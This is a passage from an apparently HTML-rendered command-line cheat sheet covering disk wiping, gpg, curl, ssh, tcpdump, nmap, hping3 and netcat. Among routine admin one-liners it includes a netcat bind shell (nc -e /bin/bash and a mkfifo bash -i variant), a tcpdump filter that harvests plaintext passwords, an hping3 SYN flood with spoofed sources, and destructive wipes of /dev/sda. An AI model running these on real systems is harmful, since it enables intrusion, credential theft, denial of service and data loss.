</code></pre><h6><a class=header href=#secure-delete-with-scrub id=secure-delete-with-scrub>Secure delete with scrub</a></h6><pre><code class=language-bash>scrub -p dod /dev/sda
scrub -p dod -r file
</code></pre><h6><a class=header href=#secure-delete-with-badblocks id=secure-delete-with-badblocks>Secure delete with badblocks</a></h6><pre><code class=language-bash>badblocks -s -w -t random -v /dev/sda
badblocks -c 10240 -s -w -t random -v /dev/sda
</code></pre><h6><a class=header href=#secure-delete-with-secure-delete id=secure-delete-with-secure-delete>Secure delete with secure-delete</a></h6><pre><code class=language-bash>srm -vz /tmp/file
sfill -vz /local
sdmem -v
swapoff /dev/sda5 &amp;&amp; sswap -vz /dev/sda5
</code></pre><hr><h5><a class=header href=#tool-a-hrefhttpsenwikipediaorgwikidd_unixdda id=tool-a-hrefhttpsenwikipediaorgwikidd_unixdda>Tool: <a href=https://en.wikipedia.org/wiki/Dd_(Unix)>dd</a></a></h5><h6><a class=header href=#show-dd-status-every-so-often id=show-dd-status-every-so-often>Show dd status every so often</a></h6><pre><code class=language-bash>dd &lt;dd_params&gt; status=progress
watch --interval 5 killall -USR1 dd
</code></pre><h6><a class=header href=#redirect-output-to-a-file-with-dd id=redirect-output-to-a-file-with-dd>Redirect output to a file with dd</a></h6><pre><code class=language-bash>echo &quot;string&quot; | dd of=filename
</code></pre><hr><h5><a class=header href=#tool-a-hrefhttpswwwgnupgorggpga id=tool-a-hrefhttpswwwgnupgorggpga>Tool: <a href=https://www.gnupg.org/>gpg</a></a></h5><h6><a class=header href=#export-public-key id=export-public-key>Export public key</a></h6><pre><code class=language-bash>gpg --export --armor &quot;&lt;username&gt;&quot; &gt; username.pkey
</code></pre><ul><li><code>--export</code> - export all keys from all keyrings or specific key<li><code>-a|--armor</code> - create ASCII armored output</ul><h6><a class=header href=#encrypt-file id=encrypt-file>Encrypt file</a></h6><pre><code class=language-bash>gpg -e -r &quot;&lt;username&gt;&quot; dump.sql
</code></pre><ul><li><code>-e|--encrypt</code> - encrypt data<li><code>-r|--recipient</code> - encrypt for specific <username></ul><h6><a class=header href=#decrypt-file id=decrypt-file>Decrypt file</a></h6><pre><code class=language-bash>gpg -o dump.sql -d dump.sql.gpg
</code></pre><ul><li><code>-o|--output</code> - use as output file<li><code>-d|--decrypt</code> - decrypt data (default)</ul><h6><a class=header href=#search-recipient id=search-recipient>Search recipient</a></h6><pre><code class=language-bash>gpg --keyserver hkp://keyserver.ubuntu.com --search-keys &quot;&lt;username&gt;&quot;
</code></pre><ul><li><code>--keyserver</code> - set specific key server<li><code>--search-keys</code> - search for keys on a key server</ul><h6><a class=header href=#list-all-of-the-packets-in-an-encrypted-file id=list-all-of-the-packets-in-an-encrypted-file>List all of the packets in an encrypted file</a></h6><pre><code class=language-bash>gpg --batch --list-packets archive.gpg
gpg2 --batch --list-packets archive.gpg
</code></pre><hr><h5><a class=header href=#tool-a-hrefhttpsgithubcomtrimstraythe-book-of-secret-knowledgetool-system-othersystem-othera id=tool-a-hrefhttpsgithubcomtrimstraythe-book-of-secret-knowledgetool-system-othersystem-othera>Tool: <a href=https://github.com/trimstray/the-book-of-secret-knowledge#tool-system-other>system-other</a></a></h5><h6><a class=header href=#reboot-system-from-init id=reboot-system-from-init>Reboot system from init</a></h6><pre><code class=language-bash>exec /sbin/init 6
</code></pre><h6><a class=header href=#init-system-from-single-user-mode id=init-system-from-single-user-mode>Init system from single user mode</a></h6><pre><code class=language-bash>exec /sbin/init
</code></pre><h6><a class=header href=#show-current-working-directory-of-a-process-2 id=show-current-working-directory-of-a-process-2>Show current working directory of a process</a></h6><pre><code class=language-bash>readlink -f /proc/&lt;PID&gt;/cwd
</code></pre><h6><a class=header href=#show-actual-pathname-of-the-executed-command id=show-actual-pathname-of-the-executed-command>Show actual pathname of the executed command</a></h6><pre><code class=language-bash>readlink -f /proc/&lt;PID&gt;/exe
</code></pre><h5><a class=header href=#tool-a-hrefhttpscurlhaxxsecurla id=tool-a-hrefhttpscurlhaxxsecurla>Tool: <a href=https://curl.haxx.se>curl</a></a></h5><pre><code class=language-bash>curl -Iks https://www.google.com
</code></pre><ul><li><code>-I</code> - show response headers only<li><code>-k</code> - insecure connection when using ssl<li><code>-s</code> - silent mode (not display body)</ul><pre><code class=language-bash>curl -Iks --location -X GET -A &quot;x-agent&quot; https://www.google.com
</code></pre><ul><li><code>--location</code> - follow redirects<li><code>-X</code> - set method<li><code>-A</code> - set user-agent</ul><pre><code class=language-bash>curl -Iks --location -X GET -A &quot;x-agent&quot; --proxy http://127.0.0.1:16379 https://www.google.com
</code></pre><ul><li><code>--proxy [socks5://|http://]</code> - set proxy server</ul><pre><code class=language-bash>curl -o file.pdf -C - https://example.com/Aiju2goo0Ja2.pdf
</code></pre><ul><li><code>-o</code> - write output to file<li><code>-C</code> - resume the transfer</ul><h6><a class=header href=#find-your-external-ip-address-external-services id=find-your-external-ip-address-external-services>Find your external IP address (external services)</a></h6><pre><code class=language-bash>curl ipinfo.io
curl ipinfo.io/ip
curl icanhazip.com
curl ifconfig.me/ip ; echo
</code></pre><h6><a class=header href=#repeat-url-request id=repeat-url-request>Repeat URL request</a></h6><pre><code class=language-bash># URL sequence substitution with a dummy query string:
curl -ks https://example.com/?[1-20]

# With shell 'for' loop:
for i in {1..20} ; do curl -ks https://example.com/ ; done
</code></pre><h6><a class=header href=#check-dns-and-http-trace-with-headers-for-specific-domains id=check-dns-and-http-trace-with-headers-for-specific-domains>Check DNS and HTTP trace with headers for specific domains</a></h6><pre><code class=language-bash>### Set domains and external dns servers.
_domain_list=(google.com) ; _dns_list=(&quot;8.8.8.8&quot; &quot;1.1.1.1&quot;)

for _domain in &quot;${_domain_list[@]}&quot; ; do

  printf '=%.0s' {1..48}

  echo

  printf &quot;[\\e[1;32m+\\e[m] resolve: %s\\n&quot; &quot;$_domain&quot;

  for _dns in &quot;${_dns_list[@]}&quot; ; do

    # Resolve domain.
    host &quot;${_domain}&quot; &quot;${_dns}&quot;

    echo

  done

  for _proto in http https ; do

    printf &quot;[\\e[1;32m+\\e[m] trace + headers: %s://%s\\n&quot; &quot;$_proto&quot; &quot;$_domain&quot;

    # Get trace and http headers.
    curl -Iks -A &quot;x-agent&quot; --location &quot;${_proto}://${_domain}&quot;

    echo

  done

done

unset _domain_list _dns_list
</code></pre><hr><h5><a class=header href=#tool-a-hrefhttpshttpieorghttpiea id=tool-a-hrefhttpshttpieorghttpiea>Tool: <a href=https://httpie.org/>httpie</a></a></h5><pre><code class=language-bash>http -p Hh https://www.google.com
</code></pre><ul><li><code>-p</code> - print request and response headers<ul><li><code>H</code> - request headers<li><code>B</code> - request body<li><code>h</code> - response headers<li><code>b</code> - response body</ul></ul><pre><code class=language-bash>http -p Hh https://www.google.com --follow --verify no
</code></pre><ul><li><code>-F, --follow</code> - follow redirects<li><code>--verify no</code> - skip SSL verification</ul><pre><code class=language-bash>http -p Hh https://www.google.com --follow --verify no \
--proxy http//127.0.0.1:16379
</code></pre><ul><li><code>--proxy [http:]</code> - set proxy server</ul><h5><a class=header href=#tool-a-hrefhttpswwwopensshcomssha id=tool-a-hrefhttpswwwopensshcomssha>Tool: <a href=https://www.openssh.com/>ssh</a></a></h5><h6><a class=header href=#escape-sequence id=escape-sequence>Escape Sequence</a></h6><pre><code># Supported escape sequences:
~.  - terminate connection (and any multiplexed sessions)
~B  - send a BREAK to the remote system
~C  - open a command line
~R  - Request rekey (SSH protocol 2 only)
~^Z - suspend ssh
~#  - list forwarded connections
~&amp;  - background ssh (when waiting for connections to terminate)
~?  - this message
~~  - send the escape character by typing it twice
</code></pre><h6><a class=header href=#compare-a-remote-file-with-a-local-file id=compare-a-remote-file-with-a-local-file>Compare a remote file with a local file</a></h6><pre><code class=language-bash>ssh user@host cat /path/to/remotefile | diff /path/to/localfile -
</code></pre><h6><a class=header href=#ssh-connection-through-host-in-the-middle id=ssh-connection-through-host-in-the-middle>SSH connection through host in the middle</a></h6><pre><code class=language-bash>ssh -t reachable_host ssh unreachable_host
</code></pre><h6><a class=header href=#run-command-over-ssh-on-remote-host id=run-command-over-ssh-on-remote-host>Run command over SSH on remote host</a></h6><pre><code class=language-bash>cat &gt; cmd.txt &lt;&lt; __EOF__
cat /etc/hosts
__EOF__

ssh host -l user $(&lt;cmd.txt)
</code></pre><h6><a class=header href=#get-public-key-from-private-key-1 id=get-public-key-from-private-key-1>Get public key from private key</a></h6><pre><code class=language-bash>ssh-keygen -y -f ~/.ssh/id_rsa
</code></pre><h6><a class=header href=#get-all-fingerprints id=get-all-fingerprints>Get all fingerprints</a></h6><pre><code class=language-bash>ssh-keygen -l -f .ssh/known_hosts
</code></pre><h6><a class=header href=#ssh-authentication-with-user-password id=ssh-authentication-with-user-password>SSH authentication with user password</a></h6><pre><code class=language-bash>ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no user@remote_host
</code></pre><h6><a class=header href=#ssh-authentication-with-publickey id=ssh-authentication-with-publickey>SSH authentication with publickey</a></h6><pre><code class=language-bash>ssh -o PreferredAuthentications=publickey -o PubkeyAuthentication=yes -i id_rsa user@remote_host
</code></pre><h6><a class=header href=#simple-recording-ssh-session id=simple-recording-ssh-session>Simple recording SSH session</a></h6><pre><code class=language-bash>function _ssh_sesslog() {

  _sesdir=&quot;&lt;path/to/session/logs&gt;&quot;

  mkdir -p &quot;${_sesdir}&quot; &amp;&amp; \
  ssh $@ 2&gt;&amp;1 | tee -a &quot;${_sesdir}/$(date +%Y%m%d).log&quot;

}

# Alias:
alias ssh='_ssh_sesslog'
</code></pre><h6><a class=header href=#using-keychain-for-ssh-logins id=using-keychain-for-ssh-logins>Using Keychain for SSH logins</a></h6><pre><code class=language-bash>### Delete all of ssh-agent's keys.
function _scl() {

  /usr/bin/keychain --clear

}

### Add key to keychain.
function _scg() {

  /usr/bin/keychain /path/to/private-key
  source &quot;$HOME/.keychain/$HOSTNAME-sh&quot;

}
</code></pre><h6><a class=header href=#ssh-login-without-processing-any-login-scripts id=ssh-login-without-processing-any-login-scripts>SSH login without processing any login scripts</a></h6><pre><code class=language-bash>ssh -tt user@host bash
</code></pre><h6><a class=header href=#ssh-local-port-forwarding id=ssh-local-port-forwarding>SSH local port forwarding</a></h6><p>Example 1:<pre><code class=language-bash># Forwarding our local 2250 port to nmap.org:443 from localhost through localhost
host1&gt; ssh -L 2250:nmap.org:443 localhost

# Connect to the service:
host1&gt; curl -Iks --location -X GET https://localhost:2250
</code></pre><p>Example 2:<pre><code class=language-bash># Forwarding our local 9051 port to db.d.x:5432 from localhost through node.d.y
host1&gt; ssh -nNT -L 9051:db.d.x:5432 node.d.y

# Connect to the service:
host1&gt; psql -U db_user -d db_dev -p 9051 -h localhost
</code></pre><ul><li><code>-n</code> - redirects stdin from <code>/dev/null</code><li><code>-N</code> - do not execute a remote command<li><code>-T</code> - disable pseudo-terminal allocation</ul><h6><a class=header href=#ssh-remote-port-forwarding id=ssh-remote-port-forwarding>SSH remote port forwarding</a></h6><pre><code class=language-bash># Forwarding our local 9051 port to db.d.x:5432 from host2 through node.d.y
host1&gt; ssh -nNT -R 9051:db.d.x:5432 node.d.y

# Connect to the service:
host2&gt; psql -U postgres -d postgres -p 8000 -h localhost
</code></pre><hr><h5><a class=header href=#tool-a-hrefhttpswwwtldporgldpabshtmldevref1htmllinux-deva id=tool-a-hrefhttpswwwtldporgldpabshtmldevref1htmllinux-deva>Tool: <a href=https://www.tldp.org/LDP/abs/html/devref1.html>linux-dev</a></a></h5><h6><a class=header href=#testing-remote-connection-to-port id=testing-remote-connection-to-port>Testing remote connection to port</a></h6><pre><code class=language-bash>timeout 1 bash -c &quot;&lt;/dev/&lt;proto&gt;/&lt;host&gt;/&lt;port&gt;&quot; &gt;/dev/null 2&gt;&amp;1 ; echo $?
</code></pre><ul><li><code>&lt;proto</code> - set protocol (tcp/udp)<li><code>&lt;host></code> - set remote host<li><code>&lt;port></code> - set destination port</ul><h6><a class=header href=#read-and-write-to-tcp-or-udp-sockets-with-common-bash-tools id=read-and-write-to-tcp-or-udp-sockets-with-common-bash-tools>Read and write to TCP or UDP sockets with common bash tools</a></h6><pre><code class=language-bash>exec 5&lt;&gt;/dev/tcp/&lt;host&gt;/&lt;port&gt;; cat &lt;&amp;5 &amp; cat &gt;&amp;5; exec 5&gt;&amp;-
</code></pre><hr><h5><a class=header href=#tool-a-hrefhttpwwwtcpdumporgtcpdumpa id=tool-a-hrefhttpwwwtcpdumporgtcpdumpa>Tool: <a href=http://www.tcpdump.org/>tcpdump</a></a></h5><h6><a class=header href=#filter-incoming-on-interface-traffic-specific-a-hrefipportipporta id=filter-incoming-on-interface-traffic-specific-a-hrefipportipporta>Filter incoming (on interface) traffic (specific <a href=ip:port>ip:port</a>)</a></h6><pre><code class=language-bash>tcpdump -ne -i eth0 -Q in host 192.168.252.1 and port 443
</code></pre><ul><li><code>-n</code> - don't convert addresses (<code>-nn</code> will not resolve hostnames or ports)<li><code>-e</code> - print the link-level headers<li><code>-i [iface|any]</code> - set interface<li><code>-Q|-D [in|out|inout]</code> - choose send/receive direction (<code>-D</code> - for old tcpdump versions)<li><code>host [ip|hostname]</code> - set host, also <code>[host not]</code><li><code>[and|or]</code> - set logic<li><code>port [1-65535]</code> - set port number, also <code>[port not]</code></ul><h6><a class=header href=#filter-incoming-on-interface-traffic-specific-a-hrefipportipporta-and-write-to-a-file id=filter-incoming-on-interface-traffic-specific-a-hrefipportipporta-and-write-to-a-file>Filter incoming (on interface) traffic (specific <a href=ip:port>ip:port</a>) and write to a file</a></h6><pre><code class=language-bash>tcpdump -ne -i eth0 -Q in host 192.168.252.1 and port 443 -c 5 -w tcpdump.pcap
</code></pre><ul><li><code>-c [num]</code> - capture only num number of packets<li><code>-w [filename]</code> - write packets to file, <code>-r [filename]</code> - reading from file</ul><h6><a class=header href=#capture-all-icmp-packets id=capture-all-icmp-packets>Capture all ICMP packets</a></h6><pre><code class=language-bash>tcpdump -nei eth0 icmp
</code></pre><h6><a class=header href=#check-protocol-used-tcp-or-udp-for-service id=check-protocol-used-tcp-or-udp-for-service>Check protocol used (TCP or UDP) for service</a></h6><pre><code class=language-bash>tcpdump -nei eth0 tcp port 22 -vv -X | egrep &quot;TCP|UDP&quot;
</code></pre><h6><a class=header href=#display-ascii-text-to-parse-the-output-using-grep-or-other id=display-ascii-text-to-parse-the-output-using-grep-or-other>Display ASCII text (to parse the output using grep or other)</a></h6><pre><code class=language-bash>tcpdump -i eth0 -A -s0 port 443
</code></pre><h6><a class=header href=#grab-everything-between-two-keywords id=grab-everything-between-two-keywords>Grab everything between two keywords</a></h6><pre><code class=language-bash>tcpdump -i eth0 port 80 -X | sed -n -e '/username/,/=ldap/ p'
</code></pre><h6><a class=header href=#grab-user-and-pass-ever-plain-http id=grab-user-and-pass-ever-plain-http>Grab user and pass ever plain http</a></h6><pre><code class=language-bash>tcpdump -i eth0  port http -l -A | egrep -i \
'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass |user ' \
--color=auto --line-buffered -B20
</code></pre><h6><a class=header href=#extract-http-user-agent-from-http-request-header id=extract-http-user-agent-from-http-request-header>Extract HTTP User Agent from HTTP request header</a></h6><pre><code class=language-bash>tcpdump -ei eth0 -nn -A -s1500 -l | grep &quot;User-Agent:&quot;
</code></pre><h6><a class=header href=#capture-only-http-get-and-post-packets id=capture-only-http-get-and-post-packets>Capture only HTTP GET and POST packets</a></h6><pre><code class=language-bash>tcpdump -ei eth0 -s 0 -A -vv \
'tcp[((tcp[12:1] &amp; 0xf0) &gt;&gt; 2):4] = 0x47455420' or 'tcp[((tcp[12:1] &amp; 0xf0) &gt;&gt; 2):4] = 0x504f5354'
</code></pre><p>or simply:<pre><code class=language-bash>tcpdump -ei eth0 -s 0 -v -n -l | egrep -i &quot;POST /|GET /|Host:&quot;
</code></pre><h6><a class=header href=#rotate-capture-files id=rotate-capture-files>Rotate capture files</a></h6><pre><code class=language-bash>tcpdump -ei eth0 -w /tmp/capture-%H.pcap -G 3600 -C 200
</code></pre><ul><li><code>-G &lt;num></code> - pcap will be created every <code>&lt;num></code> seconds<li><code>-C &lt;size></code> - close the current pcap and open a new one if is larger than <code>&lt;size></code></ul><h6><a class=header href=#top-hosts-by-packets id=top-hosts-by-packets>Top hosts by packets</a></h6><pre><code class=language-bash>tcpdump -ei enp0s25 -nnn -t -c 200 | cut -f 1,2,3,4 -d '.' | sort | uniq -c | sort -nr | head -n 20
</code></pre><h6><a class=header href=#excludes-any-rfc-1918-private-address id=excludes-any-rfc-1918-private-address>Excludes any RFC 1918 private address</a></h6><pre><code class=language-bash>tcpdump -nei eth0 'not (src net (10 or 172.16/12 or 192.168/16) and dst net (10 or 172.16/12 or 192.168/16))'
</code></pre><hr><h5><a class=header href=#tool-a-hrefhttptcpicksourceforgenettcpicka id=tool-a-hrefhttptcpicksourceforgenettcpicka>Tool: <a href=http://tcpick.sourceforge.net/>tcpick</a></a></h5><h6><a class=header href=#analyse-packets-in-real-time id=analyse-packets-in-real-time>Analyse packets in real-time</a></h6><pre><code class=language-bash>while true ; do tcpick -a -C -r dump.pcap ; sleep 2 ; clear ; done
</code></pre><hr><h5><a class=header href=#tool-a-hrefhttpngrepsourceforgenetusagehtmlngrepa id=tool-a-hrefhttpngrepsourceforgenetusagehtmlngrepa>Tool: <a href=http://ngrep.sourceforge.net/usage.html>ngrep</a></a></h5><pre><code class=language-bash>ngrep -d eth0 &quot;www.domain.com&quot; port 443
</code></pre><ul><li><code>-d [iface|any]</code> - set interface<li><code>[domain]</code> - set hostname<li><code>port [1-65535]</code> - set port number</ul><pre><code class=language-bash>ngrep -d eth0 &quot;www.domain.com&quot; src host 10.240.20.2 and port 443
</code></pre><ul><li><code>(host [ip|hostname])</code> - filter by ip or hostname<li><code>(port [1-65535])</code> - filter by port number</ul><pre><code class=language-bash>ngrep -d eth0 -qt -O ngrep.pcap &quot;www.domain.com&quot; port 443
</code></pre><ul><li><code>-q</code> - quiet mode (only payloads)<li><code>-t</code> - added timestamps<li><code>-O [filename]</code> - save output to file, <code>-I [filename]</code> - reading from file</ul><pre><code class=language-bash>ngrep -d eth0 -qt 'HTTP' 'tcp'
</code></pre><ul><li><code>HTTP</code> - show http headers<li><code>tcp|udp</code> - set protocol<li><code>[src|dst] host [ip|hostname]</code> - set direction for specific node</ul><pre><code class=language-bash>ngrep -l -q -d eth0 -i &quot;User-Agent: curl*&quot;
</code></pre><ul><li><code>-l</code> - stdout line buffered<li><code>-i</code> - case-insensitive search</ul><hr><h5><a class=header href=#tool-a-hrefhttpwwwhpingorghping3a id=tool-a-hrefhttpwwwhpingorghping3a>Tool: <a href=http://www.hping.org/>hping3</a></a></h5><pre><code class=language-bash>hping3 -V -p 80 -s 5050 &lt;scan_type&gt; www.google.com
</code></pre><ul><li><code>-V|--verbose</code> - verbose mode<li><code>-p|--destport</code> - set destination port<li><code>-s|--baseport</code> - set source port<li><code>&lt;scan_type></code> - set scan type<ul><li><code>-F|--fin</code> - set FIN flag, port open if no reply<li><code>-S|--syn</code> - set SYN flag<li><code>-P|--push</code> - set PUSH flag<li><code>-A|--ack</code> - set ACK flag (use when ping is blocked, RST response back if the port is open)<li><code>-U|--urg</code> - set URG flag<li><code>-Y|--ymas</code> - set Y unused flag (0x80 - nullscan), port open if no reply<li><code>-M 0 -UPF</code> - set TCP sequence number and scan type (URG+PUSH+FIN), port open if no reply</ul></ul><pre><code class=language-bash>hping3 -V -c 1 -1 -C 8 www.google.com
</code></pre><ul><li><code>-c [num]</code> - packet count<li><code>-1</code> - set ICMP mode<li><code>-C|--icmptype [icmp-num]</code> - set icmp type (default icmp-echo = 8)</ul><pre><code class=language-bash>hping3 -V -c 1000000 -d 120 -S -w 64 -p 80 --flood --rand-source &lt;remote_host&gt;
</code></pre><ul><li><code>--flood</code> - sent packets as fast as possible (don't show replies)<li><code>--rand-source</code> - random source address mode<li><code>-d --data</code> - data size<li><code>-w|--win</code> - winsize (default 64)</ul><hr><h5><a class=header href=#tool-a-hrefhttpsnmaporgnmapa id=tool-a-hrefhttpsnmaporgnmapa>Tool: <a href=https://nmap.org/>nmap</a></a></h5><h6><a class=header href=#ping-scans-the-network id=ping-scans-the-network>Ping scans the network</a></h6><pre><code class=language-bash>nmap -sP 192.168.0.0/24
</code></pre><h6><a class=header href=#show-only-open-ports id=show-only-open-ports>Show only open ports</a></h6><pre><code class=language-bash>nmap -F --open 192.168.0.0/24
</code></pre><h6><a class=header href=#full-tcp-port-scan-using-with-service-version-detection id=full-tcp-port-scan-using-with-service-version-detection>Full TCP port scan using with service version detection</a></h6><pre><code class=language-bash>nmap -p 1-65535 -sV -sS -T4 192.168.0.0/24
</code></pre><h6><a class=header href=#nmap-scan-and-pass-output-to-nikto id=nmap-scan-and-pass-output-to-nikto>Nmap scan and pass output to Nikto</a></h6><pre><code class=language-bash>nmap -p80,443 192.168.0.0/24 -oG - | nikto.pl -h -
</code></pre><h6><a class=header href=#recon-specific-ipservice-with-nmap-nse-scripts-stack id=recon-specific-ipservice-with-nmap-nse-scripts-stack>Recon specific ip:service with Nmap NSE scripts stack</a></h6><pre><code class=language-bash># Set variables:
_hosts=&quot;192.168.250.10&quot;
_ports=&quot;80,443&quot;

# Set Nmap NSE scripts stack:
_nmap_nse_scripts=&quot;+dns-brute,\
                   +http-auth-finder,\
                   +http-chrono,\
                   +http-cookie-flags,\
                   +http-cors,\
                   +http-cross-domain-policy,\
                   +http-csrf,\
                   +http-dombased-xss,\
                   +http-enum,\
                   +http-errors,\
                   +http-git,\
                   +http-grep,\
                   +http-internal-ip-disclosure,\
                   +http-jsonp-detection,\
                   +http-malware-host,\
                   +http-methods,\
                   +http-passwd,\
                   +http-phpself-xss,\
                   +http-php-version,\
                   +http-robots.txt,\
                   +http-sitemap-generator,\
                   +http-shellshock,\
                   +http-stored-xss,\
                   +http-title,\
                   +http-unsafe-output-escaping,\
                   +http-useragent-tester,\
                   +http-vhosts,\
                   +http-waf-detect,\
                   +http-waf-fingerprint,\
                   +http-xssed,\
                   +traceroute-geolocation.nse,\
                   +ssl-enum-ciphers,\
                   +whois-domain,\
                   +whois-ip&quot;

# Set Nmap NSE script params:
_nmap_nse_scripts_args=&quot;dns-brute.domain=${_hosts},http-cross-domain-policy.domain-lookup=true,&quot;
_nmap_nse_scripts_args+=&quot;http-waf-detect.aggro,http-waf-detect.detectBodyChanges,&quot;
_nmap_nse_scripts_args+=&quot;http-waf-fingerprint.intensive=1&quot;

# Perform scan:
nmap --script=&quot;$_nmap_nse_scripts&quot; --script-args=&quot;$_nmap_nse_scripts_args&quot; -p &quot;$_ports&quot; &quot;$_hosts&quot;
</code></pre><hr><h5><a class=header href=#tool-a-hrefhttpnetcatsourceforgenetnetcata id=tool-a-hrefhttpnetcatsourceforgenetnetcata>Tool: <a href=http://netcat.sourceforge.net/>netcat</a></a></h5><pre><code class=language-bash>nc -kl 5000
</code></pre><ul><li><code>-l</code> - listen for an incoming connection<li><code>-k</code> - listening after client has disconnected<li><code>>filename.out</code> - save receive data to file (optional)</ul><pre><code class=language-bash>nc 192.168.0.1 5051 &lt; filename.in
</code></pre><ul><li><code>&lt; filename.in</code> - send data to remote host</ul><pre><code class=language-bash>nc -vz 10.240.30.3 5000
</code></pre><ul><li><code>-v</code> - verbose output<li><code>-z</code> - scan for listening daemons</ul><pre><code class=language-bash>nc -vzu 10.240.30.3 1-65535
</code></pre><ul><li><code>-u</code> - scan only udp ports</ul><h6><a class=header href=#transfer-data-file-archive id=transfer-data-file-archive>Transfer data file (archive)</a></h6><pre><code class=language-bash>server&gt; nc -l 5000 | tar xzvfp -
client&gt; tar czvfp - /path/to/dir | nc 10.240.30.3 5000
</code></pre><h6><a class=header href=#launch-remote-shell id=launch-remote-shell>Launch remote shell</a></h6><pre><code class=language-bash># 1)
server&gt; nc -l 5000 -e /bin/bash
client&gt; nc 10.240.30.3 5000

# 2)
server&gt; rm -f /tmp/f; mkfifo /tmp/f
server&gt; cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc -l 127.0.0.1 5000 &gt; /tmp/f
client&gt; nc 10.240.30.3 5000
</code></pre><h6><a class=header href=#simple-file-server id=simple-file-server>Simple file server</a></h6><pre><code class=language-bash>while true ; do nc -l 5000 | tar -xvf - ; done
</code></pre><h6><a class=header href=#simple-minimal-http-server id=simple-minimal-http-server>Simple minimal HTTP Server</a></h6><pre><code class=language-bash>while true ; do nc -l -p 1500 -c 'echo -e &quot;HTTP/1.1 200 OK\n\n $(date)&quot;' ; done
</code></pre><h6><a class=header href=#simple-http-server id=simple-http-server>Simple HTTP Server</a></h6><blockquote><p>Restarts web server after each request - remove <code>while</code> condition for only single connection.</blockquote><pre><code class=language-bash>cat &gt; index.html &lt;&lt; __EOF__
&lt;!doctype html&gt;
    &lt;head&gt;
        &lt;meta charset=&quot;utf-8&quot;&gt;
        &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge,chrome=1&quot;&gt;
        &lt;title&gt;&lt;/title&gt;
        &lt;meta name=&quot;description&quot; content=&quot;&quot;&gt;
        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;
    &lt;/head&gt;
    &lt;body&gt;

    &lt;p&gt;

      Hello! It's a site.

    &lt;/p&gt;

    &lt;/body&gt;
&lt;/html&gt;
__EOF__
</code></pre><pre><code class=language-bash>server&gt; while : ; do \
(echo -ne &quot;HTTP/1.1 200 OK\r\nContent-Length: $(wc -c &lt;index.html)\r\n\r\n&quot; ; cat index.html;) | \
nc -l -p 5000 \
; done
</code></pre><ul><li><code>-p</code> - port number</ul><h6><a class=header href=#simple-http-proxy-single-connection id=simple-http-proxy-single-connection>Simple HTTP Proxy (single connection)</a></h6><pre><code class=language-bash>#!/usr/bin/env bash

if [[ $# != 2 ]] ; then
  printf &quot;%s\\n&quot; \
         &quot;usage: ./nc-proxy listen-port bk_host:bk_port&quot;
fi

_listen_port=&quot;$1&quot;
_bk_host=$(echo &quot;$2&quot; | cut -d &quot;:&quot; -f1)
_bk_port=$(echo &quot;$2&quot; | cut -d &quot;:&quot; -f2)

printf &quot;  lport: %s\\nbk_host: %s\\nbk_port: %s\\n\\n&quot; \
       &quot;$_listen_port&quot; &quot;$_bk_host&quot; &quot;$_bk_port&quot;

_tmp=$(mktemp -d)
_back=&quot;$_tmp/pipe.back&quot;
_sent=&quot;$_tmp/pipe.sent&quot;
_recv=&quot;$_tmp/pipe.recv&quot;

trap 'rm -rf &quot;$_tmp&quot;' EXIT

mkfifo -m 0600 &quot;$_back&quot; &quot;$_sent&quot; &quot;$_recv&quot;

sed &quot;s/^/=&gt; /&quot; &lt;&quot;$_sent&quot; &amp;
sed &quot;s/^/&lt;=  /&quot; &lt;&quot;$_recv&quot; &amp;

nc -l -p &quot;$_listen_port&quot; &lt;&quot;$_back&quot; | \
tee &quot;$_sent&quot; | \
nc &quot;$_bk_host&quot; &quot;$_bk_port&quot; | \
tee &quot;$_recv&quot; &gt;&quot;$_back&quot;
</code></pre><pre><code class=language-bash>server&gt; chmod +x nc-proxy &amp;&amp; ./nc-proxy 8080 192.168.252.10:8000
  lport: 8080
bk_host: 192.168.252.10
bk_port: 8000

client&gt; http -p h 10.240.30.3:8080
HTTP/1.1 200 OK
Accept-Ranges: bytes
Cache-Control: max-age=31536000
Content-Length: 2748
Content-Type: text/html; charset=utf-8
Date: Sun, 01 Jul 2018 2008 GMT
Last-Modified: Sun, 01 Apr 2018 2137 GMT
</code></pre><h6><a class=header href=#create-a-single-use-tcp-or-udp-proxy id=create-a-single-use-tcp-or-udp-proxy>Create a single-use TCP or UDP proxy</a></h6><pre><code class=language-bash>### TCP -&gt; TCP
nc -l -p 2000 -c &quot;nc [ip|hostname] 3000&quot;

### TCP -&gt; UDP
nc -l -p 2000 -c &quot;nc -u [ip|hostname] 3000&quot;

### UDP -&gt; UDP
nc -l -u -p 2000 -c &quot;nc -u [ip|hostname] 3000&quot;

### UDP -&gt; TCP
nc -l -u -p 2000 -c &quot;nc [ip|hostname] 3000&quot;
</code></pre><hr><h5><a class=header href=#tool-a-hrefhttpsgnutlsorgmanualhtml_nodegnutls_002dcli-invocationhtmlgnutls-clia id=tool-a-hrefhttpsgnutlsorgmanualhtml_nodegnutls_002dcli-invocationhtmlgnutls-clia>Tool: <a href=https://gnutls.org/manual/html_node/gnutls_002dcli-Invocation.html>gnutls-cli</a></a></h5><h6><a class=header href=#testing-connection-to-remote-host-with-sni-support id=testing-connection-to-remote-host-with-sni-support>Testing connection to remote host (with SNI support)</a></h6><pre><code class=language-bash>gnutls-cli -p 443 google.com
</code></pre><h6><a class=header href=#testing-connection-to-remote-host-without-sni-support id=testing-connection-to-remote-host-without-sni-support>Testing connection to remote host (without SNI support)</a></h6><pre><code class=language-bash>gnutls-cli --disable-sni -p 443 google.com
</code></pre><hr><h5><a class=header href=#tool-a-hrefhttpwwwdest-unreachorgsocatdocsocathtmlsocata id=tool-a-hrefhttpwwwdest-unreachorgsocatdocsocathtmlsocata>Tool: <a href=http://www.dest-unreach.org/socat/doc/socat.html>socat</a></a></h5><h6><a class=header href=#testing-remote-connection-to-port-1 id=testing-remote-connection-to-port-1>Testing remote connection to port</a></h6><pre><code class=language-bash>socat - TCP4:10.240.30.3:22
